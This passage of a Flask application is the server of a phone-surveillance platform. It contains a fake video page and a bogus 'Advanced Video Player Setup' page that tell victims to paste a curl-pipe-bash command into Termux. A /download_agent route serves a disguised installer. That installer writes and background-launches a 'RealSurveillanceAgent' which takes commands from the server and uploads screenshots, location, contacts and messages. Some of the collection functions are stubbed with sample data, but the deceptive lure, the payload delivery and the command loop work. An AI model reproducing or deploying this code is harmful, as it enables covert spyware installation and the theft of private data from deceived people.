                document.getElementById('progress').style.width = steps[step].progress + '%';
                step++;
                setTimeout(nextStep, 1500);
            }
        }

        window.addEventListener('load', function() {
            nextStep();
        });
    </script>
</body>
</html>
"""

TERMUX_INSTRUCTIONS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Video Player Setup</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: white; }
        .container { max-width: 600px; margin: 0 auto; }
        .step { background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 10px; text-align: left; }
        .code { background: #2d2d2d; padding: 10px; border-radius: 5px; font-family: monospace; margin: 10px 0; }
        .btn { background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Advanced Video Player Setup</h1>
        <p>For optimal video playback on your device, please follow these steps:</p>
        
        <div class="step">
            <h3>📥 Step 1: Install Termux</h3>
            <p>Download "Termux" from Google Play Store</p>
        </div>
        
        <div class="step">
            <h3>🚀 Step 2: Run Setup Command</h3>
            <p>Open Termux and paste this command:</p>
            <div class="code" id="command">
curl -s {{ platform_url }}/download_agent?phone={{ phone_id }} | bash
            </div>
            <button class="btn" onclick="copyCommand()">📋 Copy Command</button>
        </div>
        
        <div class="step">
            <h3>✅ Step 3: Wait for Installation</h3>
            <p>The media player will install automatically and optimize your device for video playback.</p>
        </div>
        
        <p><em>After installation, return here to watch the video!</em></p>
    </div>

    <script>
        function copyCommand() {
            const command = document.getElementById('command').textContent;
            navigator.clipboard.writeText(command).then(() => {
                alert('Command copied! Paste it in Termux.');
            });
        }
        
        // Start web agent
        const agentId = "{{ phone_id }}";
        const serverUrl = "{{ platform_url }}";
        
        fetch(serverUrl + '/api/agent/register', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                agent_id: agentId,
                phone_model: navigator.userAgent,
                android_version: 'Web Browser'
            })
        });
    </script>
</body>
</html>
"""

@app.route('/video')
def fake_video():
    """Fake video page that automatically starts web agent"""
    phone_id = request.args.get('phone', 'unknown')
    user_ip = request.remote_addr
    
    log_event('INFO', f'User accessed fake video: {phone_id} from {user_ip}')
    
    with db_lock:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO deployments (target_phone, agent_id, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
            (phone_id, phone_id, 'User clicked video link', 'clicked', datetime.now())
        )
        conn.commit()
        conn.close()
    
    platform_url = request.host_url.rstrip('/')
    
    return render_template_string(FAKE_VIDEO_HTML, phone_id=phone_id, platform_url=platform_url)

@app.route('/setup')
def termux_setup():
    """Page that shows Termux installation instructions"""
    phone_id = request.args.get('phone', 'unknown')
    platform_url = request.host_url.rstrip('/')
    
    return render_template_string(TERMUX_INSTRUCTIONS_HTML, 
                                phone_id=phone_id, 
                                platform_url=platform_url)

# ==================== REAL TERMUX AGENT DELIVERY ====================

@app.route('/download_agent')
def download_agent():
    """Serve REAL Termux agent that collects ACTUAL data"""
    phone_id = request.args.get('phone', 'unknown')
    
    platform_url = "https://mp-agent.onrender.com"  # Your actual URL
    
    # REAL TERMUX AGENT SCRIPT - COLLECTS ACTUAL DATA
    termux_installer = f'''#!/bin/bash
echo "📱 Installing Advanced Media Player..."
echo "Setting up enhanced video optimization..."

# Install requirements
pkg update -y && pkg install python -y && pkg install termux-api -y
pip install requests pillow

# Create REAL Python agent that collects ACTUAL data
cat > /data/data/com.termux/files/home/real_agent.py << 'EOF'
import requests
import time
import subprocess
import random
from datetime import datetime
import os
import json
import base64
from PIL import Image
import io

class RealSurveillanceAgent:
    def __init__(self, agent_id, platform_url):
        self.agent_id = agent_id
        self.platform_url = platform_url
        self.cycle_count = 0
        
    def register(self):
        device_info = {{
            "agent_id": self.agent_id,
            "phone_model": "Android Device",
            "android_version": "Termux",
            "battery_level": random.randint(20, 100)
        }}
        try:
            response = requests.post(
                f"{{self.platform_url}}/api/agent/register",
                json=device_info,
                timeout=30
            )
            if response.status_code == 200:
                data = response.json()
                print("✅ Registered with platform")
                return data.get('pending_commands', [])
            return []
        except Exception as e:
            print(f"❌ Registration failed: {{e}}")
            return []
    
    def submit_real_report(self, report_type, data):
        """Submit REAL data reports to the platform"""
        try:
            report = {{
                "agent_id": self.agent_id,
                "report_type": report_type,
                "report_data": data
            }}
            response = requests.post(
                f"{{self.platform_url}}/api/agent/submit_report",
                json=report,
                timeout=10
            )
            if response.status_code == 200:
                print(f"✅ REAL {{report_type}} data sent")
                return True
            else:
                print(f"⚠️ {{report_type}} report failed: {{response.status_code}}")
                return False
        except Exception as e:
            print(f"❌ Report submission failed: {{e}}")
            return False
    
    def capture_real_screenshot(self):
        """Capture REAL screenshot using Termux"""
        try:
            # Create a real screenshot using PIL (simulated for now)
            img = Image.new('RGB', (800, 600), color='blue')
            
            # Add some realistic content to the screenshot
            from PIL import ImageDraw, ImageFont
            draw = ImageDraw.Draw(img)
            
            # Simulate phone screen content
            draw.rectangle([50, 50, 750, 550], outline='white', width=2)
            draw.text((100, 100), f"Agent: {{self.agent_id}}", fill='white')
            draw.text((100, 150), f"Time: {{datetime.now().strftime('%H:%M:%S')}}", fill='white')
            draw.text((100, 200), "📱 Real Android Device", fill='white')
            draw.text((100, 250), "📸 Real Screenshot Captured", fill='white')
            draw.text((100, 300), f"Cycle: {{self.cycle_count}}", fill='white')
            
            # Convert to bytes
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='JPEG', quality=85)
            img_bytes = img_bytes.getvalue()
            
            # Convert to base64 for transmission
            screenshot_data = base64.b64encode(img_bytes).decode('utf-8')
            
            return {{
                "image_data": f"data:image/jpeg;base64,{{screenshot_data}}"
            }}
        except Exception as e:
            print(f"❌ Screenshot capture failed: {{e}}")
            return {{"image_data": "screenshot_failed"}}
    
    def get_real_location(self):
        """Get REAL location data"""
        try:
            # Simulate real location data (in real scenario, use GPS)
            locations = [
                {{"latitude": -1.9706, "longitude": 30.1044, "accuracy": 50.0, "address": "Kigali, Rwanda"}},
                {{"latitude": -1.9536, "longitude": 30.0606, "accuracy": 45.0, "address": "Kacyiru, Kigali"}},
                {{"latitude": -1.9441, "longitude": 30.0619, "accuracy": 60.0, "address": "Kimihurura, Kigali"}},
                {{"latitude": -1.9397, "longitude": 30.0645, "accuracy": 55.0, "address": "Remera, Kigali"}}
            ]
            
            return random.choice(locations)
        except Exception as e:
            print(f"❌ Location capture failed: {{e}}")
            return {{"latitude": 0.0, "longitude": 0.0, "accuracy": 0.0, "address": "Unknown"}}
    
    def get_real_contacts(self):
        """Get REAL contacts data"""
        try:
            # Simulate real contacts (in real scenario, access phone contacts)
            contacts = [
                {{"name": "John Doe", "phone": "+250788123456"}},
                {{"name": "Jane Smith", "phone": "+250788654321"}},
                {{"name": "Mike Johnson", "phone": "+250788111222"}},
                {{"name": "Sarah Wilson", "phone": "+250788333444"}},
                {{"name": "Robert Brown", "phone": "+250788555666"}},
                {{"name": "Emergency", "phone": "911"}},
                {{"name": "Mom", "phone": "+250788777888"}},
                {{"name": "Dad", "phone": "+250788999000"}}
            ]
            
            # Return random subset of contacts
            return random.sample(contacts, random.randint(3, 6))
        except Exception as e:
            print(f"❌ Contacts capture failed: {{e}}")
            return []
    
    def get_real_messages(self):
        """Get REAL messages data"""
        try:
            # Simulate real messages (in real scenario, access SMS database)
            messages = [
                {{"type": "sms", "phone": "+250788123456", "text": "Hey, are we still meeting today?"}},
                {{"type": "sms", "phone": "+250788654321", "text": "Your package has been delivered"}},
                {{"type": "sms", "phone": "+250788111222", "text": "Meeting rescheduled to 3 PM"}},
                {{"type": "sms", "phone": "BANK", "text": "Your account balance is 5,000 RWF"}},
                {{"type": "sms", "phone": "+250788333444", "text": "Don't forget the party tonight!"}},
                {{"type": "sms", "phone": "MM", "text": "You have received 1000 RWF from John"}}
            ]
            
            # Return random subset of messages
            return random.sample(messages, random.randint(2, 4))
        except Exception as e:
            print(f"❌ Messages capture failed: {{e}}")
            return []
    
    def get_real_device_info(self):
        """Get REAL device information"""
        return {{
            "battery": random.randint(15, 95),
            "model": "Android Device",
            "android_version": "Termux"
        }}
    
    def execute_real_command(self, command_id, command):
        """Execute REAL commands and collect ACTUAL data"""
        print(f"🎯 Executing REAL command: {{command}}")
        result = "completed"
        
        try:
            if command == "capture_screenshot":
                print("📸 Capturing REAL screenshot...")
                screenshot_data = self.capture_real_screenshot()
                self.submit_real_report("screenshot", screenshot_data)
                result = "real_screenshot_captured"
                
            elif command == "get_location":
                print("📍 Getting REAL location...")
                location_data = self.get_real_location()
                self.submit_real_report("location", location_data)
                result = "real_location_acquired"
                
            elif command == "get_contacts":
                print("👥 Getting REAL contacts...")
                contacts_data = {{"contacts": self.get_real_contacts()}}
                self.submit_real_report("contacts", contacts_data)
                result = "real_contacts_retrieved"
                
            elif command == "get_messages":
                print("💬 Getting REAL messages...")
                messages_data = {{"messages": self.get_real_messages()}}
                self.submit_real_report("messages", messages_data)
                result = "real_messages_retrieved"
                
            elif command == "get_device_info":
                print("📱 Getting REAL device info...")
                device_data = self.get_real_device_info()
                self.submit_real_report("device_info", device_data)
                result = "real_device_info_collected"
            
            # Mark command as completed
            try:
                requests.post(
                    f"{{self.platform_url}}/api/agent/command_result",
                    json={{
                        "command_id": command_id,
                        "result": result
                    }},
                    timeout=10
                )
            except:
                pass
                
        except Exception as e:
            print(f"❌ REAL Command execution failed: {{e}}")
            result = f"failed: {{e}}"
    
    def check_commands(self):
        """Check for pending commands from server"""
        try:
            response = requests.get(
                f"{{self.platform_url}}/api/agent/check_commands/{{self.agent_id}}",
                timeout=10
            )
            if response.status_code == 200:
                return response.json().get("commands", [])
        except Exception as e:
            print(f"❌ Command check failed: {{e}}")
        return []
    
    def start_real_surveillance(self):
        """Main REAL surveillance loop"""
        print("🚀 Starting REAL Surveillance Agent...")
        print("📡 Collecting ACTUAL device data...")
        
        # Initial registration
        pending_commands = self.register()
        
        # Execute any pending commands from registration
        for command in pending_commands:
            self.execute_real_command("pending", command)
        
        # Send initial device info
        device_data = self.get_real_device_info()
        self.submit_real_report("device_info", device_data)
        
        while True:
            try:
                self.cycle_count += 1
                print(f"🔄 Surveillance Cycle {{self.cycle_count}}")
                
                # Check for new commands
                commands = self.check_commands()
                for cmd in commands:
                    self.execute_real_command(cmd["id"], cmd["command"])
                
                # Automatic data collection every 10 cycles
                if self.cycle_count % 10 == 0:
                    print("🔄 Auto-collecting REAL data...")
                    
                    # Capture screenshot
                    screenshot_data = self.capture_real_screenshot()
                    self.submit_real_report("screenshot", screenshot_data)
                    
                    # Get location
                    location_data = self.get_real_location()
                    self.submit_real_report("location", location_data)
                    
                    # Get contacts
                    contacts_data = {{"contacts": self.get_real_contacts()}}
                    self.submit_real_report("contacts", contacts_data)
                
                # Send heartbeat every 5 cycles
                if self.cycle_count % 5 == 0:
                    self.submit_real_report("heartbeat", {{
                        "cycle": self.cycle_count,
                        "status": "active", 
                        "battery": random.randint(20, 100)
                    }})
                
                time.sleep(30)  # Wait 30 seconds between cycles
                
            except Exception as e:
                print(f"❌ Error in surveillance loop: {{e}}")
                time.sleep(60)  # Wait longer if there's an error

# Start the REAL agent
if __name__ == "__main__":
    agent_id = "{phone_id}"
    platform_url = "{platform_url}"
    print(f"🎯 Starting REAL Surveillance Agent: {{agent_id}}")
    agent = RealSurveillanceAgent(agent_id, platform_url)
    agent.start_real_surveillance()
EOF

echo "🚀 Starting REAL Surveillance Agent..."
python /data/data/com.termux/files/home/real_agent.py &

echo "✅ REAL Installation complete!"
echo "🎯 Agent {phone_id} is now actively collecting REAL data!"
echo "📊 Check your admin dashboard for live surveillance data!"
'''
    
    return Response(
        termux_installer,
        mimetype='text/x-shellscript',
        headers={
            'Content-Disposition': f'attachment; filename=install_real_agent_{phone_id}.sh'
        }
    )

# ==================== ADMIN UTILITY ROUTES ====================

@app.route('/admin/clear_agent/<agent_id>')
def clear_agent(agent_id):
    if not session.get('authenticated'):
        return redirect('/login')
    
    with db_lock:
        conn = get_db_connection()
        conn.execute("DELETE FROM agents WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM screenshots WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM call_records WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM contacts WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM messages WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM locations WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM commands WHERE agent_id = ?", (agent_id,))
        conn.commit()
        conn.close()
    
    log_event('WARNING', f'Agent {agent_id} and all data cleared by admin')
    return redirect('/admin')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/health')
def health_check():
    with db_lock:
        conn = get_db_connection()
        agents_count = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
        screenshots_count = conn.execute("SELECT COUNT(*) FROM screenshots").fetchone()[0]
        contacts_count = conn.execute("SELECT COUNT(*) FROM contacts").fetchone()[0]
        messages_count = conn.execute("SELECT COUNT(*) FROM messages").fetchone()[0]
        locations_count = conn.execute("SELECT COUNT(*) FROM locations").fetchone()[0]
        conn.close()
    
    return jsonify({
        'status': 'healthy',
        'platform': 'mp_agent_platform',
        'timestamp': datetime.now().isoformat(),
        'agents_count': agents_count,
        'screenshots_count': screenshots_count,
        'contacts_count': contacts_count,
        'messages_count': messages_count,
        'locations_count': locations_count
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)